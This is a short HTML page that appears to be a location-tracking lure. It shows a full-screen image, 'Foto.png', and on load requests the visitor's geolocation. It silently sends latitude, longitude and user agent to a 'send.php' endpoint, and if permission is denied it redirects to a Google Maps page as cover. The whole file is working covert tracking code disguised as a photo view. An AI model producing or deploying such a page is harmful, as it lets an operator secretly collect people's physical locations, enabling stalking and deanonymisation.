<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      overflow: hidden;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
    }
  </style>
</head>
<body onload="getLocation()">
  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
      }
    }

    function showPosition(position) {
      
      const xhttp = new XMLHttpRequest();
      xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent);
      xhttp.send();
    }


    function handleLocationError(error) {
      if (error.code === error.PERMISSION_DENIED) {
        
        window.location.href = "https://www.google.com/intl/es_ES/maps/about/#!/"; 
      }
    }


  </script>
  <iframe src="Foto.png" class="giphy-embed" allowfullscreen></iframe>
</body>
</html>
